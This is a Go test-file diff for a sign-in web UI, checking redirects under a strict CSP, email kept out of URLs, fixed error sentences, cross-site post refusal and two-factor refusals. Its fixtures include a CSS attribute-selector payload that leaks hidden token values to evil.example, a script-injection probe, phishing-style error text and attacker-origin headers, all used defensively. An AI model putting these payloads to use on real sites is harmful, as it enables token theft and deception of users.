@@ -2,10 +2,12 @@ package pages
 
 import (
 	"encoding/json"
+	"html"
 	"io"
 	"net/http"
 	"net/http/httptest"
 	"net/url"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -145,6 +147,23 @@ func siThemed() *fakeUpstream {
 	return f
 }
 
+var refreshTarget = regexp.MustCompile(`<meta http-equiv="refresh" content="0;url=([^"]*)">`)
+
+// leftFor is where a form post's answer sends the browser when the destination
+// may redirect to another origin (SignIn.leave): not a 303, which the CSP's
+// form-action 'self' would block at the cross-origin hop, but a 200 page that
+// navigates there itself (meta refresh, and a link).
+func leftFor(t *testing.T, rec *httptest.ResponseRecorder) string {
+	t.Helper()
+	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
+	assert.Empty(t, rec.Header().Get("Location"), "a 303 would be followed under form-action")
+	assert.Contains(t, rec.Header().Get("Content-Security-Policy"), "form-action 'self'", "form-action is not relaxed")
+	m := refreshTarget.FindStringSubmatch(rec.Body.String())
+	require.NotNil(t, m, rec.Body.String())
+	assert.Contains(t, rec.Body.String(), `<a href="`+m[1]+`">Continue</a>`)
+	return html.UnescapeString(m[1])
+}
+
 func TestSafeUIRedirect(t *testing.T) {
 	for in, want := range map[string]string{
 		"/ui":  "/ui",
@@ -245,8 +264,7 @@ func TestEmailStep(t *testing.T) {
 		up.reply("POST /auth/check-domain", 200, `{"authMethod":"external","loginUrl":"/auth/oidc/login?domain=acme.example","idpIssuer":"https://idp"}`)
 		rec := siPost("/ui/auth/login/email", "email", "a@acme.example", "oauth", "true", "client_id", "app1", "redirect_uri", "https://app/cb",
 			"state", "s1", "redirect", "/ui/roles").do(signInRouter(up, false))
-		require.Equal(t, http.StatusSeeOther, rec.Code)
-		loc, err := url.Parse(rec.Header().Get("Location"))
+		loc, err := url.Parse(leftFor(t, rec))
 		require.NoError(t, err)
 		assert.Equal(t, "/auth/oidc/login", loc.Path)
 		q := loc.Query()
@@ -274,7 +292,12 @@ func TestEmailStep(t *testing.T) {
 		assert.Contains(t, body, `action="/ui/auth/login/password"`)
 		assert.Contains(t, body, `name="email" value="a@b.c"`)
 		assert.Contains(t, body, `autocomplete="current-password"`)
-		assert.Contains(t, body, "/ui/auth/forgot-password?")
+		// "Forgot password?" posts the address (not the password) to the
+		// forgot page: the address is in no URL.
+		assert.Contains(t, body, `form="signin-forgot"`)
+		assert.Contains(t, body, `<form id="signin-forgot" method="post" action="/ui/auth/forgot-password/start" hidden><input type="hidden" name="redirect" value="/ui/x"><input type="hidden" name="email" value="a@b.c"></form>`)
+		assert.NotContains(t, body, "forgot-password?")
+		assert.NotContains(t, body, "a%40b.c")
 	})
 	t.Run("a user who never set a password is offered the emailed link", func(t *testing.T) {
 		up := siThemed()
@@ -341,7 +364,10 @@ func TestPasswordStep(t *testing.T) {
 		up := siThemed()
 		up.reply("POST /auth/login", 200, `{"status":"ok"}`)
 		rec := siPost("/ui/auth/login/password", "email", "a@b.c", "password", "pw", "oauth", "true", "client_id", "app1", "state", "s").do(signInRouter(up, false))
-		assert.Equal(t, "/oauth/authorize?client_id=app1&state=s", rec.Header().Get("Location"))
+		assert.Equal(t, "/oauth/authorize?client_id=app1&state=s", leftFor(t, rec))
+		// An OIDC interaction too.
+		rec = siPost("/ui/auth/login/password", "email", "a@b.c", "password", "pw", "interaction", "uid_1").do(signInRouter(up, false))
+		assert.Equal(t, "/oidc/interaction/uid_1/login", leftFor(t, rec))
 	})
 	t.Run("an unknown user and a wrong password get the same page", func(t *testing.T) {
 		up := siThemed()
@@ -408,7 +434,10 @@ func TestPasswordStep(t *testing.T) {
 		up := siThemed()
 		rec := siReq{target: "/ui/auth/login?redirect=%2Fui%2Fx"}.do(signInRouter(up, false))
 		require.Equal(t, http.StatusOK, rec.Code)
-		assert.Contains(t, rec.Body.String(), "/ui/auth/passkey?next=%2Fui%2Fx")
+		// A post of the email form (the typed address with it, never in a URL).
+		assert.Contains(t, rec.Body.String(), `formaction="/ui/auth/passkey"`)
+		assert.Contains(t, rec.Body.String(), `name="next" value="/ui/x"`)
+		assert.NotContains(t, rec.Body.String(), "/ui/auth/passkey?")
 		rec = siReq{target: "/ui/auth/login?oauth=true"}.do(signInRouter(up, false))
 		require.Equal(t, http.StatusOK, rec.Code)
 		assert.NotContains(t, rec.Body.String(), "/ui/auth/passkey")
@@ -519,11 +548,19 @@ func TestCallback(t *testing.T) {
 		assert.Contains(t, rec.Body.String(), "did not complete")
 		assert.Contains(t, rec.Body.String(), `href="/ui/auth/login"`)
 	})
-	t.Run("a provider error is shown escaped", func(t *testing.T) {
-		rec := siReq{target: "/ui/auth/callback?error=access_denied&error_description=%3Cscript%3Ealert(1)%3C/script%3E"}.do(signInRouter(siThemed(), true))
+	t.Run("a provider error is a fixed sentence, never the link's text", func(t *testing.T) {
+		rec := siReq{target: "/ui/auth/callback?error=access_denied&error_description=Call+support+at+0800+EVIL"}.do(signInRouter(siThemed(), true))
 		assert.Equal(t, http.StatusUnauthorized, rec.Code, "an error wins over a session")
-		assert.NotContains(t, rec.Body.String(), "<script>alert")
-		assert.Contains(t, rec.Body.String(), "&lt;script&gt;")
+		assert.Contains(t, rec.Body.String(), "The sign-in was cancelled or refused")
+		assert.NotContains(t, rec.Body.String(), "0800")
+		for _, code := range []string{"Your+account+is+locked.+Call+0800", "%3Cscript%3Ealert(1)%3C/script%3E"} {
+			rec = siReq{target: "/ui/auth/callback?error=" + code + "&error_description=x"}.do(signInRouter(siThemed(), false))
+			assert.Equal(t, http.StatusUnauthorized, rec.Code)
+			assert.Contains(t, rec.Body.String(), "The sign-in did not complete. Try signing in again.")
+			assert.NotContains(t, rec.Body.String(), "0800")
+			assert.NotContains(t, rec.Body.String(), "alert(1)")
+		}
+		assert.Contains(t, siReq{target: "/ui/auth/callback?error=temporarily_unavailable"}.do(signInRouter(siThemed(), false)).Body.String(), "is unavailable")
 	})
 }
 
@@ -548,9 +585,11 @@ func TestPostsFromAnotherSiteAreRefused(t *testing.T) {
 	up.reply("POST /auth/login", 200, `{"status":"ok"}`, "Set-Cookie", sessionSetCookie)
 	up.reply("POST /auth/logout", 204, ``)
 	h := signInRouter(up, false)
-	for _, target := range []string{"/ui/auth/login/email", "/ui/auth/login/password", "/ui/auth/login/2fa", "/ui/auth/login/setup", "/ui/auth/logout",
+	for _, target := range []string{
+		"/ui/auth/login/email", "/ui/auth/login/password", "/ui/auth/login/2fa", "/ui/auth/login/setup", "/ui/auth/logout",
 		"/ui/auth/forgot-password", "/ui/auth/reset-password", "/ui/auth/set-password",
-		"/ui/auth/portal-login/email", "/ui/auth/portal-login/password", "/ui/auth/portal-login/reset"} {
+		"/ui/auth/portal-login/email", "/ui/auth/portal-login/password", "/ui/auth/portal-login/reset",
+	} {
 		for name, headers := range map[string]map[string]string{
 			"cross-site":          {"Sec-Fetch-Site": "cross-site", "Origin": "https://attacker.test"},
 			"foreign origin only": {"Origin": "https://attacker.test"},
@@ -569,4 +608,74 @@ func TestPostsFromAnotherSiteAreRefused(t *testing.T) {
 	}
 	assert.Empty(t, up.callsTo("POST /auth/login"), "a refused post never reaches the endpoint")
 	assert.Empty(t, up.callsTo("POST /auth/logout"))
+}
+
+// The tenant's stylesheet is applied as the SPA does, except on the pages that
+// carry a token in a hidden field (the second factor, the enrolment hand-over,
+// the reset form): CSS can read an attribute value and, with img-src https:,
+// send it out as an image request.
+func TestCustomCSSIsKeptOffPagesWithTokens(t *testing.T) {
+	themed := func() *fakeUpstream {
+		up := &fakeUpstream{}
+		up.reply("GET /api/public/login-theme", 200, `{"customCss":"input[value^=a]{background:url(https://evil.example/a)}","accentColor":"#ff0000"}`)
+		return up
+	}
+	const css = "input[value^=a]"
+
+	up := themed()
+	assert.Contains(t, siReq{target: "/ui/auth/login"}.do(signInRouter(up, false)).Body.String(), css, "the email step is styled")
+
+	up = themed()
+	up.reply("POST /auth/login", 200, `{"status":"mfa_required","mfaToken":"PENDING.TOKEN","methods":["TOTP"]}`)
+	body := siPost("/ui/auth/login/password", "email", "a@b.c", "password", "pw").do(signInRouter(up, false)).Body.String()
+	assert.Contains(t, body, `value="PENDING.TOKEN"`)
+	assert.NotContains(t, body, css)
+	assert.Contains(t, body, "#ff0000", "the colours stay")
+	body = siPost("/ui/auth/login/2fa", "email", "a@b.c", "mfaToken", "PENDING.TOKEN", "methods", "TOTP", "switch", "RECOVERY_CODE").do(signInRouter(up, false)).Body.String()
+	assert.NotContains(t, body, css)
+
+	up = themed()
+	up.reply("POST /auth/login", 200, `{"status":"enrollment_required","enrollToken":"ENROLL.TOKEN","allowedMethods":["TOTP"]}`)
+	body = siPost("/ui/auth/login/password", "email", "a@b.c", "password", "pw", "redirect", "/ui/x").do(signInRouter(up, false)).Body.String()
+	assert.Contains(t, body, `value="ENROLL.TOKEN"`)
+	assert.NotContains(t, body, css)
+
+	up = themed()
+	up.reply("GET /auth/password-reset/validate", 200, `{"valid":true,"reason":null,"requiresFactor":false}`)
+	body = siReq{target: "/ui/auth/reset-password?token=RESET.TOKEN"}.do(signInRouter(up, false)).Body.String()
+	assert.Contains(t, body, `value="RESET.TOKEN"`)
+	assert.NotContains(t, body, css)
+}
+
+// The pages that are reached with the typed address get it in the body of a
+// POST, so it is in no URL (history, logs, Referer).
+func TestEmailTravelsInThePostNotTheURL(t *testing.T) {
+	rec := siPost("/ui/auth/forgot-password/start", "email", "ann@b.c", "client", "acme").do(signInRouter(siThemed(), false))
+	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
+	assert.Contains(t, rec.Body.String(), `value="ann@b.c"`)
+	assert.Contains(t, rec.Body.String(), `action="/ui/auth/forgot-password"`)
+	assert.NotContains(t, rec.Body.String(), "If an account exists", "the start only fills the form in")
+}
+
+// The second factor step shows the flow's refusals: a method the account cannot
+// use, and the resend interval of the email code (the code already sent stays
+// the one to enter).
+func TestTwoFactorStepRefusals(t *testing.T) {
+	up := siThemed()
+	up.reply("POST /auth/2fa/verify", 400, `{"code":"METHOD_NOT_ALLOWED","message":"that method is not available for this account"}`)
+	rec := siPost("/ui/auth/login/2fa", "mfaToken", "T", "method", "EMAIL_PIN", "methods", "TOTP", "code", "1").do(signInRouter(up, false))
+	assert.Equal(t, http.StatusBadRequest, rec.Code)
+	assert.Contains(t, rec.Body.String(), "That method is not available for your account.")
+	assert.Empty(t, rec.Header().Values("Set-Cookie"))
+
+	up = siThemed()
+	up.reply("POST /auth/2fa/challenge/email", 429, `{"code":"CODE_RECENTLY_SENT","message":"A code was sent recently. Wait 40 seconds before asking for another."}`, "Retry-After", "40")
+	rec = siPost("/ui/auth/login/2fa", "mfaToken", "T", "method", "EMAIL_PIN", "methods", "EMAIL_PIN", "action", "send").do(signInRouter(up, false))
+	assert.Equal(t, http.StatusTooManyRequests, rec.Code)
+	assert.Equal(t, "40", rec.Header().Get("Retry-After"))
+	assert.Contains(t, rec.Body.String(), "Wait 40 seconds")
+	assert.Contains(t, rec.Body.String(), `name="code"`)
+
+	// Recovery codes back the authenticator app: not offered without it.
+	assert.NotContains(t, rec.Body.String(), "Use a recovery code")
 }
